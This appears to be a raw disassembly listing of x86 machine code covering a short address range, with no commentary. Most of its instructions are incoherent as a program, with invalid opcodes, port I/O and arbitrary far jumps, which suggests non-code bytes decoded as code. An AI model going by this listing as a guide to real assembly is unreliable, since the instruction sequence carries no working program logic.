  48cad9:	mov    al,0xec
  48cadb:	sub    dh,bh
  48cadd:	sahf   
  48cade:	neg    DWORD PTR [esi+0x38]
  48cae1:	and    dl,BYTE PTR [edx+esi*4]
  48cae4:	cmp    BYTE PTR [esi],al
  48cae6:	int3   
  48cae7:	adc    BYTE PTR [esi],bl
  48cae9:	jo     0x48cb45
  48caeb:	mov    al,ds:0x14aec580
  48caf0:	inc    ecx
  48caf1:	jp     0x48caff
  48caf3:	pop    eax
  48caf4:	xchg   DWORD PTR [ebx+0x79790bb],esp
  48cafa:	xor    eax,0x38096754
  48caff:	jmp    0x7656:0x10891dfa
  48cb06:	add    bh,dh
  48cb08:	inc    eax
  48cb09:	in     eax,dx
  48cb0a:	loopne 0x48cb1c
  48cb0c:	lock mov al,ds:0xb1586e8
  48cb12:	inc    esi
  48cb13:	dec    eax
  48cb14:	bnd je 0x48caba
  48cb17:	push   0x42
  48cb19:	jp     0x48caac
  48cb1b:	dec    edi
  48cb1c:	or     al,0xf8
  48cb1e:	add    edx,DWORD PTR [edx+0x380c1730]
  48cb24:	or     dh,ch
  48cb26:	(bad)  
  48cb27:	arpl   WORD PTR [edi+0x54],cx
  48cb2a:	pop    edx
  48cb2b:	adc    BYTE PTR ds:[ebx+edi*4-0x68],dl
  48cb30:	add    dl,dl
  48cb32:	dec    eax
  48cb33:	scas   eax,DWORD PTR es:[edi]
  48cb34:	fs dec edi
  48cb36:	jae    0x48cb0b
  48cb38:	cmp    eax,DWORD PTR ds:0x73445a50
  48cb3e:	or     BYTE PTR [eax+esi*8],cl
  48cb41:	mov    eax,0xa71000f
  48cb46:	adc    BYTE PTR [ecx+eax*1],dh
  48cb49:	add    esi,DWORD PTR [edi-0x4dd9ade0]
  48cb4f:	cmp    DWORD PTR [ebx+edi*8-0x53],ebp
  48cb53:	or     al,0x10
  48cb55:	push   esp
  48cb56:	outs   dx,DWORD PTR ds:[esi]
  48cb57:	mov    ds:0x68410dcd,al
  48cb5c:	inc    edi
  48cb5d:	daa    
  48cb5e:	fsub   DWORD PTR [ecx]
  48cb60:	jae    0x48cb1e
  48cb62:	pop    edx
  48cb63:	vmptrst QWORD PTR [edi+eax*2-0x27]
  48cb68:	add    DWORD PTR fs:[ecx+0x5e],ecx
  48cb6c:	in     al,0x18
  48cb6e:	prefetch BYTE PTR [ebp-0x10965cf3]
  48cb75:	dec    eax
  48cb76:	xchg   BYTE PTR [ebx+0x68],ch
  48cb79:	sub    DWORD PTR [ecx+0xa],eax
  48cb7c:	fcos   
  48cb7e:	mov    edi,0x431da54e
  48cb83:	push   ds
  48cb84:	jmp    0xcc30:0xa34de72b
  48cb8b:	inc    ebp
  48cb8c:	std    
  48cb8d:	das    
  48cb8e:	mov    cl,0xec
  48cb90:	popa   
  48cb91:	cmp    bl,bh
  48cb93:	jge    0x48cbdd
  48cb95:	(bad)  
  48cb96:	sbb    BYTE PTR [ebx+0x66],bl
  48cb99:	or     BYTE PTR [ecx+0x4f],cl
  48cb9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48cb9d:	sub    DWORD PTR [ecx-0x42],ecx
  48cba0:	daa    
  48cba1:	ins    BYTE PTR es:[edi],dx
  48cba2:	mov    ecx,eax
  48cba4:	loope  0x48cba8
  48cba6:	int    0xda
  48cba8:	xchg   edx,eax
  48cba9:	mov    eax,0x25d6677
  48cbae:	(bad)  
  48cbaf:	dec    eax
  48cbb0:	pop    esi
  48cbb1:	dec    edi
  48cbb2:	pcmpgtb mm4,QWORD PTR [edi]
  48cbb5:	iret   
  48cbb6:	jb     0x48cc25
  48cbb8:	inc    esp
  48cbb9:	pop    ebx
  48cbba:	and    ah,BYTE PTR [esi+0x4]
  48cbbd:	cmp    bl,BYTE PTR [edx+0x44660a27]
  48cbc3:	add    ch,BYTE PTR [eax-0x61]
  48cbc6:	lods   al,BYTE PTR ds:[esi]
  48cbc7:	jnp    0x48cb9e
  48cbc9:	call   0x8812:0xb5f1509
  48cbd0:	jns    0x48cc21
  48cbd2:	cmp    eax,DWORD PTR [edx]
  48cbd4:	mov    ds:0x67c06e80,eax
  48cbd9:	cwde   
  48cbda:	lahf   
  48cbdb:	push   ds
  48cbdc:	xchg   esi,eax
  48cbdd:	mov    al,0xa0
  48cbdf:	or     esi,DWORD PTR [edi+0x386853c6]
  48cbe5:	(bad)  
  48cbe6:	mov    eax,ds:0x17693494
  48cbeb:	es sti 
  48cbed:	inc    edx
  48cbee:	sbb    ebp,DWORD PTR [esi+0x75]
  48cbf1:	or     bl,BYTE PTR [eax]
  48cbf3:	int    0x15
  48cbf5:	push   esi
  48cbf6:	add    ch,ah
  48cbf8:	es retf 
  48cbfa:	push   es
  48cbfb:	adc    al,0xda
  48cbfd:	not    DWORD PTR [edx-0x17286791]
  48cc03:	sahf   
  48cc04:	push   es
  48cc05:	or     al,0x73
  48cc07:	add    DWORD PTR [ecx+0x513ae00b],edx
  48cc0d:	nop
  48cc0e:	pop    eax
  48cc0f:	into   
  48cc10:	inc    esp
  48cc11:	lea    ebp,[eax+edi*8+0x79]
  48cc15:	retfw  
  48cc17:	pop    es
  48cc18:	cld    
  48cc19:	or     dh,BYTE PTR [eax+0x6f]
  48cc1c:	addr16 in al,dx
  48cc1e:	adc    eax,DWORD PTR [ecx-0x2ceba5ed]
  48cc24:	adc    BYTE PTR [ebx],dl
  48cc26:	in     al,dx
  48cc27:	mov    edx,DWORD PTR [eax]
  48cc29:	outs   dx,BYTE PTR ds:[esi]
  48cc2a:	data16 sub BYTE PTR [ecx],dl
  48cc2d:	and    DWORD PTR [eax+ebx*4-0x32],edi
  48cc31:	bound  eax,QWORD PTR [ecx+0x23]
  48cc34:	push   cs
  48cc35:	push   ss
  48cc36:	gs cld 
  48cc38:	push   ds
  48cc39:	or     edx,DWORD PTR [eax]
  48cc3b:	xor    al,0xa9
  48cc3d:	jge    0x32740ae
  48cc43:	adc    edi,DWORD PTR cs:[edx-0x68337de1]
  48cc4a:	or     bl,0xc
  48cc4d:	xor    DWORD PTR [ecx],esp
  48cc4f:	adc    BYTE PTR [ebx+0x46],0x38
  48cc53:	inc    ecx
  48cc54:	call   0x21ff:0x5c9c6b23
  48cc5b:	aaa    
  48cc5c:	sub    DWORD PTR [ebx+edi*4+0x15],ebp
  48cc60:	fbstp  TBYTE PTR [esi+0x3ff1a79]
  48cc66:	pop    esp
  48cc67:	fs ins DWORD PTR es:[edi],dx
  48cc69:	mov    ch,0x12
  48cc6b:	push   eax
  48cc6c:	jb     0x48cc77
  48cc6e:	ss int3 
  48cc70:	cld    
  48cc71:	imul   ebp,DWORD PTR [ebp+0x61],0xbd0a7972
  48cc78:	or     al,0x14
  48cc7a:	xchg   DWORD PTR [ebx],esi
  48cc7c:	ja     0x48ccdf
  48cc7e:	leave  
  48cc7f:	sbb    DWORD PTR [edi+0x3eaf5cf0],esp
  48cc85:	pop    ss
  48cc86:	sbb    eax,0x606e56bd
  48cc8b:	popa   
  48cc8c:	sub    eax,0xcc5cec02
  48cc91:	ins    BYTE PTR es:[edi],dx
  48cc92:	mov    al,ds:0x806f707c
  48cc97:	inc    eax
  48cc98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48cc99:	pop    esi
  48cc9a:	test   al,0x38
  48cc9c:	xlat   BYTE PTR ds:[ebx]
  48cc9d:	sbb    al,0x25
  48cc9f:	inc    esi
  48cca0:	or     al,0x1d
  48cca2:	pop    esi
  48cca3:	ds inc esi
  48cca5:	or     edi,eax
  48cca7:	js     0x48cccf
  48cca9:	add    cl,BYTE PTR [ebp-0x8a2c770]
  48ccaf:	out    dx,eax
  48ccb0:	push   ebp
  48ccb1:	cmp    BYTE PTR [ebx],ah
  48ccb3:	jne    0x48cc7c
  48ccb5:	inc    ecx
  48ccb6:	xor    al,0x5d
  48ccb8:	nop
  48ccb9:	arpl   WORD PTR [ebx-0x58],di
  48ccbc:	cld    
  48ccbd:	xchg   esp,eax
  48ccbe:	popa   
  48ccbf:	or     al,0x48
  48ccc1:	imul   esp,DWORD PTR [esi+eax*2+0x1e],0x477c0c0a
  48ccc9:	adc    DWORD PTR [edx],ecx
  48cccb:	push   ecx
  48cccc:	iret   
  48cccd:	or     BYTE PTR [esi+0x4e0b0b08],0x10
  48ccd4:	mov    cl,bl
  48ccd6:	add    DWORD PTR [ecx-0x3ef94d3f],0x48ed6cdb
  48cce0:	in     eax,0xbd
  48cce2:	rol    DWORD PTR [esi+0x755110c4],cl
  48cce8:	jo     0x48cd63
  48ccea:	stos   DWORD PTR es:[edi],eax
  48cceb:	add    dl,BYTE PTR [ecx]
  48cced:	bound  edx,QWORD PTR [ecx+0xc4b6e46]
  48ccf3:	lods   al,BYTE PTR ds:[esi]
  48ccf4:	ret    0xc7c0
  48ccf7:	sub    BYTE PTR [eax-0x44],al
  48ccfa:	das    
  48ccfb:	mov    bh,0x8
  48ccfd:	pop    esi
  48ccfe:	xchg   BYTE PTR [esi],cl
  48cd00:	(bad)  
  48cd01:	mov    ah,0x80
  48cd03:	call   FWORD PTR [ebx-0x7d]
  48cd06:	adc    DWORD PTR [ebx],eax
  48cd08:	dec    ebp
  48cd09:	jae    0x48cd72
  48cd0b:	push   es
  48cd0c:	push   esp
  48cd0d:	push   edi
  48cd0e:	dec    ebp
  48cd0f:	sbb    eax,DWORD PTR ds:0xbdae2020
  48cd15:	add    edi,ecx
  48cd17:	inc    ebx
  48cd18:	in     al,0xde
  48cd1a:	js     0x48cd60
  48cd1c:	ja     0x48cd14
  48cd1e:	(bad)  [edi-0x9]
  48cd21:	test   BYTE PTR [ecx+0x70a0186],al
  48cd27:	pusha  
  48cd28:	pop    esp
  48cd29:	add    al,0xfe
  48cd2b:	or     al,0x2
  48cd2d:	jmp    0x73aa1136
  48cd32:	sbb    DWORD PTR [ebx+eax*1+0x594c0b1d],ecx
  48cd39:	mov    al,ds:0x919858c1
  48cd3e:	mov    eax,ds:0x318b6819
  48cd43:	cwde   
  48cd44:	inc    eax
  48cd45:	aaa    
  48cd46:	retf   0xfb92
  48cd49:	ja     0x48cd13
  48cd4b:	lahf   
  48cd4c:	add    eax,DWORD PTR [edi-0x24]
  48cd4f:	pop    edi
  48cd50:	inc    esp
  48cd51:	add    BYTE PTR [eax-0x40e1019f],al
  48cd57:	jb     0x48cd60
  48cd59:	sahf   
  48cd5a:	outs   dx,BYTE PTR ds:[esi]
  48cd5b:	clc    
  48cd5c:	inc    esi
  48cd5d:	js     0x48cdb7
  48cd5f:	inc    esp
  48cd60:	call   0x9c4911f2
  48cd65:	(bad)  
  48cd66:	jl     0x48cda1
  48cd68:	enter  0x4495,0x18
  48cd6c:	mov    ah,0x44
  48cd6e:	add    al,0x90
  48cd70:	test   BYTE PTR [ebp-0x160fc7bc],dl
  48cd76:	lods   eax,DWORD PTR ds:[esi]
  48cd77:	les    edx,FWORD PTR [ecx-0x6c6d6d72]
  48cd7d:	inc    esp
  48cd7e:	inc    edi
  48cd7f:	seto   BYTE PTR [edi+0x79]
  48cd83:	xchg   esp,eax
  48cd84:	fwait
  48cd85:	inc    esp
  48cd86:	cmp    al,0xd7
  48cd88:	inc    esp
  48cd89:	add    BYTE PTR [esp+ecx*4+0x74],bl
  48cd8d:	cwde   
  48cd8e:	outs   dx,DWORD PTR ds:[esi]
  48cd8f:	dec    eax
  48cd90:	push   ds
  48cd91:	nop
  48cd92:	inc    esp
  48cd93:	push   0x8e5c4499
  48cd98:	sub    BYTE PTR [esi],cl
  48cd9a:	and    edi,esi
  48cd9c:	rcr    BYTE PTR [edx-0x642bb8bc],0x44
  48cda3:	js     0x48cd47
  48cda5:	push   cs
  48cda6:	ins    BYTE PTR es:[edi],dx
  48cda7:	push   cs
  48cda8:	pop    esi
  48cda9:	cmp    al,0xaf
  48cdab:	data16 mov dl,0x58
  48cdae:	mov    cl,0x47
  48cdb0:	push   ds
  48cdb1:	in     al,0x41
  48cdb3:	ds aam 0xb3
  48cdb6:	inc    esp
  48cdb7:	sar    BYTE PTR [edx+0x44cfe444],1
  48cdbd:	jnp    0x48cdf5
  48cdbf:	fild   DWORD PTR [ecx-0x3c]
  48cdc2:	rcl    BYTE PTR [esi],0xe8
  48cdc5:	nop
  48cdc6:	fs xchg ecx,eax
  48cdc8:	rol    DWORD PTR [esi],cl
  48cdca:	ja     0x48cd82
  48cdcc:	int    0x66
  48cdce:	and    BYTE PTR [esi-0x4a5f3138],cl
  48cdd4:	sahf   
  48cdd5:	jl     0x48cda7
  48cdd7:	neg    BYTE PTR [edi]
  48cdd9:	push   cs
  48cdda:	and    dl,BYTE PTR [eax]
  48cddc:	out    0x3c,eax
  48cdde:	push   edx
  48cddf:	loopne 0x48ce3b
  48cde1:	adc    esp,eax
  48cde3:	fnsave [edi-0x7e]
  48cde6:	push   cs
  48cde7:	adc    al,0x5b
  48cde9:	jb     0x48cdf9
  48cdeb:	cmp    eax,0xefa716ce
  48cdf0:	es add al,0xb2
  48cdf3:	aaa    
  48cdf4:	add    BYTE PTR [ecx-0xed5f00],al
  48cdfa:	inc    edx
  48cdfb:	cmp    dh,bh
  48cdfd:	adc    DWORD PTR [ecx],eax
  48cdff:	pop    ss
  48ce00:	add    DWORD PTR [eax],esp
  48ce02:	add    DWORD PTR [edi],ebx
  48ce04:	jmp    0x1801:0x1200119e
  48ce0b:	add    BYTE PTR [edx],ah
  48ce0d:	add    al,BYTE PTR [edx+0x28b60846]
  48ce13:	adc    al,BYTE PTR [edx]
  48ce15:	push   ebx
  48ce16:	into   
  48ce17:	xchg   esi,eax
  48ce18:	inc    esi
  48ce19:	cli    
  48ce1a:	sub    al,0x60
  48ce1c:	mov    bh,0x85
  48ce1e:	mov    al,0x18
  48ce20:	mov    al,0x17
  48ce22:	mov    al,ds:0x7e3a02c8
  48ce27:	add    DWORD PTR [edx],ecx
  48ce29:	or     eax,0x2c3b80b0
  48ce2e:	out    dx,al
  48ce2f:	push   cs
  48ce30:	mov    al,0x15
  48ce32:	mov    al,ds:0xf2ee125a
  48ce37:	sbb    eax,0x291221b0
  48ce3c:	pop    edi
  48ce3d:	stc    
  48ce3e:	sub    eax,DWORD PTR [eax+0x6e]
  48ce41:	or     BYTE PTR [eax-0x4c4fbc],dh
  48ce47:	mov    dl,0xb1
  48ce49:	push   DWORD PTR [eax-0x47f45001]
  48ce4f:	rol    eax,0xff
  48ce52:	scas   al,BYTE PTR es:[edi]
  48ce53:	scas   al,BYTE PTR es:[edi]
  48ce54:	lods   eax,DWORD PTR ds:[esi]
  48ce55:	jmp    FWORD PTR [edx+eax*1-0x6df165fc]
  48ce5c:	shl    ah,1
  48ce5e:	mov    edx,DWORD PTR ds:0xab1fd020
  48ce64:	adc    ch,BYTE PTR [esp+edi*4]
  48ce67:	add    bh,BYTE PTR [esi]
  48ce69:	in     eax,dx
  48ce6a:	repz call 0xbe54:0x440eacbd
  48ce72:	push   es
  48ce73:	mov    BYTE PTR [eax],bl
  48ce75:	mov    edi,0x69ef3cf9
  48ce7a:	js     0x48ce28
  48ce7c:	push   cs
  48ce7d:	(bad)  
  48ce7e:	cld    
  48ce7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48ce80:	shl    bl,0xdd
  48ce83:	ja     0x48ce64
  48ce85:	push   es
  48ce86:	add    al,0xc1
  48ce88:	inc    esi
  48ce89:	push   es
  48ce8a:	adc    al,0xc2
  48ce8c:	ds push es
  48ce8e:	add    al,0xc3
  48ce90:	(bad)  
  48ce92:	ds dec edi
  48ce94:	xor    al,bh
  48ce96:	pop    eax
  48ce97:	lds    edx,FWORD PTR [esi]
  48ce99:	dec    eax
  48ce9a:	aam    0xe
  48ce9c:	sbb    ch,dl
  48ce9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ce9f:	jge    0x48cf08
  48cea1:	jnp    0x48cea9
  48cea3:	(bad)  
  48cea4:	ds mov al,0xc6
  48cea7:	pop    esi
  48cea8:	in     al,0xa2
  48ceaa:	push   ss
  48ceab:	aam    0xcf
  48cead:	shr    DWORD PTR [esi+edi*4-0x8],cl
  48ceb1:	push   es
  48ceb2:	call   0x6cf3f361
  48ceb7:	mov    WORD PTR [edi+ecx*8-0x3864cb0d],ss
  48cebe:	or     al,0xcd
  48cec0:	sub    al,0x34
  48cec2:	test   BYTE PTR [esp+ebp*2-0x4a],bh
  48cec6:	retf   0xa3bb
  48cec9:	ss es clc 
  48cecc:	mov    edx,0xc8b83806
  48ced1:	xchg   esi,eax
  48ced2:	sahf   
  48ced3:	ja     0x48ceb4
  48ced5:	ror    esp,cl
  48ced7:	fs push ds
  48ced9:	adc    al,0x98
  48cedb:	cs push es
  48cedd:	push   esp
  48cede:	cld    
  48cedf:	mov    ebp,0xb078fcf7
  48cee4:	push   0xffffff94
  48cee6:	mov    edx,0x16d48ebb
  48ceeb:	cdq    
  48ceec:	imul   ebx,DWORD PTR [edi-0x53f14c9a],0x689af4a4
  48cef6:	rcl    dh,0x46
  48cef9:	js     0x48ceb8
  48cefb:	ss sbb eax,edx
  48cefe:	mov    DWORD PTR [ebx],eax
  48cf00:	mov    edi,DWORD PTR [eax+0x1a]
  48cf03:	pop    eax
  48cf04:	mov    ds:0x25079fc0,eax
  48cf09:	call   0x608ea3a6
  48cf0e:	adc    eax,0x893d7854
  48cf13:	in     eax,dx
  48cf14:	push   esi
  48cf15:	push   esp
  48cf16:	out    0xec,al
  48cf18:	out    0x1,eax
  48cf1a:	in     al,dx
  48cf1b:	bound  ebx,QWORD PTR [edi]
  48cf1d:	add    BYTE PTR [eax],0x39
  48cf20:	shl    eax,cl
  48cf22:	bound  eax,QWORD PTR [edi]
  48cf24:	pushf  
  48cf25:	pop    esi
  48cf26:	inc    ebx
  48cf27:	jbe    0x48cef7
  48cf29:	jo     0x48cf30
  48cf2b:	push   esp
  48cf2c:	xlat   BYTE PTR ds:[ebx]
  48cf2d:	in     al,dx
  48cf2e:	bound  ebx,QWORD PTR [ecx]
  48cf30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48cf31:	adc    edx,eax
  48cf33:	or     eax,0x5e067caf
  48cf38:	retf   
  48cf39:	push   ebp
  48cf3a:	(bad)  
  48cf3b:	cwde   
  48cf3c:	or     al,0x51
  48cf3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48cf3f:	or     eax,0xf8102066
  48cf44:	mov    eax,ds:0xa27cda0a
  48cf49:	cld    
  48cf4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48cf4b:	inc    esp
  48cf4c:	mov    eax,?
  48cf4e:	shl    BYTE PTR [ecx+ebp*8+0xd],0xc9
  48cf53:	mov    edi,0x8486e0b9
  48cf58:	jmp    0x1f63736c
  48cf5d:	pusha  
  48cf5e:	retf   
  48cf5f:	loopne 0x48cf63
  48cf61:	xchg   edx,eax
  48cf62:	fmul   DWORD PTR [eax]
  48cf64:	cmp    BYTE PTR [esp+ecx*1],cl
  48cf67:	cmp    al,0xf3
  48cf69:	sub    dh,BYTE PTR [eax+0x6c42cb01]
  48cf6f:	push   0x48e14854
  48cf74:	bnd jae 0x48cf40
  48cf77:	lods   al,BYTE PTR ds:[esi]
  48cf78:	call   DWORD PTR [ecx]
  48cf7a:	add    BYTE PTR [edi],cl
  48cf7c:	ss add al,0xb
  48cf7f:	push   eax
  48cf80:	mov    edi,0xa0b921fe
  48cf85:	jmp    0x44cf7b9c
  48cf8a:	add    al,ah
  48cf8c:	xchg   edi,eax
  48cf8d:	inc    esp
  48cf8e:	ret    0x9625
  48cf91:	inc    ecx
  48cf92:	adc    ebp,DWORD PTR [ebp-0x1a]
  48cf95:	inc    eax
  48cf96:	push   ds
  48cf97:	dec    eax
  48cf98:	mov    BYTE PTR [eax+eax*1+0x0],bl
  48cf9c:	scas   eax,DWORD PTR es:[edi]
  48cf9d:	inc    ebx
  48cf9e:	mov    ss,WORD PTR [edx-0x591beaec]
  48cfa4:	jge    0x48cfc7
  48cfa6:	leave  
  48cfa7:	xchg   DWORD PTR [eax],ebp
  48cfa9:	inc    esi
  48cfaa:	add    al,0xa4
  48cfac:	call   0xea10:0x5d225d16
  48cfb3:	repz cmp BYTE PTR [ecx],ch
  48cfb6:	push   0x43
  48cfb8:	mov    eax,0x2304ae4
  48cfbd:	push   cs
  48cfbe:	ins    BYTE PTR es:[edi],dx
  48cfbf:	ss sbb al,0x90
  48cfc2:	pop    ss
  48cfc3:	clc    
  48cfc4:	into   
  48cfc5:	mov    gs,WORD PTR [ecx+eax*1-0x80]
  48cfc9:	jne    0x48cfa5
  48cfcb:	inc    eax
  48cfcc:	fadd   DWORD PTR [eax+ebx*1+0x91adb4b]
  48cfd3:	shr    DWORD PTR [ebp+0x48339705],0x43
  48cfda:	add    ecx,DWORD PTR ds:0xda683c19
  48cfe0:	mov    bl,0x68
  48cfe2:	lods   al,BYTE PTR ds:[esi]
  48cfe3:	push   es
  48cfe4:	or     al,BYTE PTR [eax+0x1a43979a]
  48cfea:	or     eax,0xee80887c
  48cfef:	mov    ebp,DWORD PTR [edi]
  48cff1:	in     al,0xe9
  48cff3:	mov    esi,0x50684d1f
  48cff8:	sbb    eax,DWORD PTR [eax]
  48cffa:	or     cl,BYTE PTR [ecx+0x78]
  48cffd:	xchg   ecx,eax
  48cffe:	or     ebx,ebp
  48d000:	pop    es
  48d001:	sahf   
  48d002:	push   ss
  48d003:	xchg   ecx,eax
  48d004:	or     ebx,DWORD PTR [ecx+edi*4]
  48d007:	call   0xec5ae9e0
  48d00c:	inc    edx
  48d00d:	sbb    eax,0xeebc8530
  48d012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d013:	std    
  48d014:	push   ebp
  48d015:	xchg   ebp,eax
  48d016:	in     al,dx
  48d017:	push   esp
  48d018:	rcl    BYTE PTR [eax],0x2e
  48d01b:	inc    edx
  48d01c:	repnz push ds
  48d01e:	add    BYTE PTR ds:0x82e4a1d1,dl
  48d024:	fld    TBYTE PTR [ecx+0x25114c1f]
  48d02a:	je     0x48d087
  48d02c:	and    BYTE PTR [ebp-0x59],al
  48d02f:	cmovns esi,DWORD PTR [edi+0xef4f624]
  48d036:	push   ebp
  48d037:	jae    0x48d04a
  48d039:	jmp    0xdae513e
  48d03e:	outs   dx,DWORD PTR ds:[esi]
  48d03f:	sbb    ah,bl
  48d041:	loopne 0x48cfff
  48d043:	xor    DWORD PTR [edi+eax*1],edi
  48d046:	mov    cl,0x3
  48d048:	push   eax
  48d049:	and    cl,BYTE PTR [edx+0x18]
  48d04c:	xchg   esp,eax
  48d04d:	xor    BYTE PTR [ecx],ah
  48d04f:	ret    0xb90
  48d052:	and    ch,cl
  48d054:	and    edx,DWORD PTR [esp+ebx*2+0x24311270]
  48d05b:	and    eax,ecx
  48d05d:	push   ecx
  48d05e:	jb     0x48d085
  48d060:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  48d062:	mov    ecx,0x55092a
  48d067:	daa    
  48d068:	pop    ss
  48d069:	pushf  
  48d06a:	test   BYTE PTR [eax-0x5436d785],dh
  48d070:	imul   ebp,DWORD PTR [esi+ebx*2],0x2f
  48d074:	int3   
  48d075:	sub    al,0xa7
  48d077:	mov    eax,ds:0x61636746
  48d07c:	or     DWORD PTR [ecx+0x20c57c9],edi
  48d082:	adc    DWORD PTR [eax-0x23d7bb69],edi
  48d088:	dec    esp
  48d089:	sbb    bh,dl
  48d08b:	inc    DWORD PTR [edi]
  48d08d:	push   edi
  48d08e:	test   DWORD PTR [edi+0x10],ecx
  48d091:	sbb    BYTE PTR [edx],ch
  48d093:	xchg   ecx,eax
  48d094:	fstp   QWORD PTR [edx]
  48d096:	je     0x48d09c
  48d098:	sbb    cl,ch
  48d09a:	into   
  48d09b:	addr16 aam 0x21
  48d09e:	push   es
  48d09f:	jmp    0x4f318fc4
  48d0a4:	popf   
  48d0a5:	ins    BYTE PTR es:[edi],dx
  48d0a6:	xchg   edx,eax
  48d0a7:	int    0xf0
  48d0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d0aa:	add    al,0xa7
  48d0ac:	sub    ebx,DWORD PTR [edx]
  48d0ae:	cwde   
  48d0af:	push   es
  48d0b0:	dec    ebx
  48d0b1:	cs jle 0x48d04f
  48d0b4:	sub    eax,0xe8e52d4c
  48d0b9:	add    DWORD PTR [ecx],ecx
  48d0bb:	cwde   
  48d0bc:	sub    al,0x87
  48d0be:	jbe    0x48d0c9
  48d0c0:	stc    
  48d0c1:	sbb    al,0xba
  48d0c3:	jbe    0x48d13c
  48d0c5:	add    al,0xf8
  48d0c7:	enter  0x74d6,0xa8
  48d0cb:	loopne 0x48d11b
  48d0cd:	inc    edx
  48d0ce:	mov    al,0x2d
  48d0d0:	xchg   bh,bl
  48d0d2:	xor    al,0x8d
  48d0d4:	sub    ebp,DWORD PTR [esi]
  48d0d6:	in     al,0x5a
  48d0d8:	xor    al,0x2e
  48d0da:	aam    0x4f
  48d0dc:	ins    BYTE PTR es:[edi],dx
  48d0dd:	imul   edi,DWORD PTR fs:[ebx],0x4fadb0fd
  48d0e4:	jecxz  0x48d122
  48d0e6:	repz mov fs,WORD PTR [eax+0x78]
  48d0ea:	loop   0x48d11a
  48d0ec:	in     al,0x28
  48d0ee:	das    
  48d0ef:	push   eax
  48d0f0:	ret    
  48d0f1:	dec    esp
  48d0f2:	or     BYTE PTR [ebx+0x161d1709],cl
  48d0f8:	jb     0x48d0bb
  48d0fa:	mov    ecx,0x9b489330
  48d0ff:	arpl   WORD PTR [eax-0x4a],bx
  48d102:	stos   BYTE PTR es:[edi],al
  48d103:	call   0x6950:0x310baa5c
  48d10a:	add    edi,DWORD PTR [esp+ebx*2+0x56547886]
  48d111:	mov    ax,es
  48d114:	(bad)  
  48d115:	dec    esp
  48d116:	or     BYTE PTR [ebp-0xd],ch
  48d119:	lds    esi,FWORD PTR [ebx+edx*1]
  48d11c:	ret    0x6d32
  48d11f:	cld    
  48d120:	jb     0x48d0b6
  48d122:	call   0x33aa:0x9030cf90
  48d129:	dec    ebx
  48d12a:	xchg   edi,eax
  48d12b:	cmp    al,0x5c
  48d12d:	arpl   si,ax
  48d12f:	xor    eax,0x8f01355a
  48d134:	fnstsw WORD PTR [eax]
  48d136:	pop    ds
  48d137:	inc    eax
  48d138:	xor    al,0x23
  48d13a:	iret   
  48d13b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d13c:	call   0x86f5b017
  48d141:	mov    eax,0xba35498f
  48d146:	aas    
  48d147:	add    ebx,0xe2cd8fdd
  48d14d:	add    BYTE PTR [edi],0xcd
  48d150:	inc    edx
  48d151:	rol    DWORD PTR [ebx],1
  48d153:	cdq    
  48d154:	ss out dx,eax
  48d156:	push   ebx
  48d157:	sbb    al,0x70
  48d159:	xchg   DWORD PTR [eax+edx*2+0x13],ebx
  48d15d:	mov    DWORD PTR [edi],esi
  48d15f:	cmp    al,0xe7
  48d161:	mov    ecx,0xe48e79e4
  48d166:	in     al,0xa
  48d168:	cmp    dl,dh
  48d16a:	shl    BYTE PTR [edi+edi*2+0x66754282],0x66
  48d172:	gs jmp 0xaf8d7874
  48d178:	test   BYTE PTR es:[eax],dl
  48d17b:	cdq    
  48d17c:	mov    al,0x9a
  48d17e:	mov    edx,0xbb120f60
  48d183:	pushf  
  48d184:	(bad)  
  48d185:	sub    DWORD PTR [ecx],edi
  48d187:	sbb    al,BYTE PTR [eax+eiz*1-0x6c]
  48d18b:	jae    0x48d14a
  48d18d:	loope  0x48d1e1
  48d18f:	and    ecx,edi
  48d191:	mov    eax,0x2b764497
  48d196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d197:	pop    esp
  48d198:	adc    esi,edx
  48d19a:	jle    0x48d144
  48d19c:	stos   DWORD PTR es:[edi],eax
  48d19d:	cmp    al,al
  48d19f:	aad    0x17
  48d1a1:	repnz hlt 
  48d1a3:	dec    eax
  48d1a4:	pop    es
  48d1a5:	pop    eax
  48d1a6:	dec    esp
  48d1a7:	cmp    ebx,DWORD PTR [ebx]
  48d1a9:	mov    al,0xc8
  48d1ab:	add    al,0x68
  48d1ad:	dec    ebx
  48d1ae:	adc    eax,0x783c9606
  48d1b3:	jmp    0x4ec65a86
  48d1b8:	cmp    bh,bl
  48d1ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d1bb:	cmp    al,0x5b
  48d1bd:	xchg   edx,eax
  48d1be:	adc    bh,al
  48d1c0:	or     BYTE PTR [ebx-0x12],ch
  48d1c3:	push   esp
  48d1c4:	in     al,0xc0
  48d1c6:	pop    es
  48d1c7:	dec    ecx
  48d1c8:	int    0x22
  48d1ca:	jo     0x48d239
  48d1cc:	push   edi
  48d1cd:	stc    
  48d1ce:	pusha  
  48d1cf:	stos   DWORD PTR es:[edi],eax
  48d1d0:	add    BYTE PTR [edi+ecx*2+0x43404b],0xe1
  48d1d8:	ds jg  0x48d257
  48d1db:	xor    al,0x70
  48d1dd:	and    DWORD PTR [edi-0x6f276f04],ebp
  48d1e3:	aas    
  48d1e4:	inc    edx
  48d1e5:	sahf   
  48d1e6:	aaa    
  48d1e7:	sbb    al,0x6b
  48d1e9:	rol    BYTE PTR [edx-0x68],0x98
  48d1ed:	je     0x48d1bf
  48d1ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d1f0:	(bad)  
  48d1f1:	stos   BYTE PTR es:[edi],al
  48d1f2:	inc    ebx
  48d1f3:	ins    DWORD PTR es:[edi],dx
  48d1f4:	add    BYTE PTR [edx+0x3a],0xc
  48d1f8:	sbb    al,0x20
  48d1fa:	enter  0xc866,0xb5
  48d1fe:	or     BYTE PTR [ecx+eax*2+0x0],bl
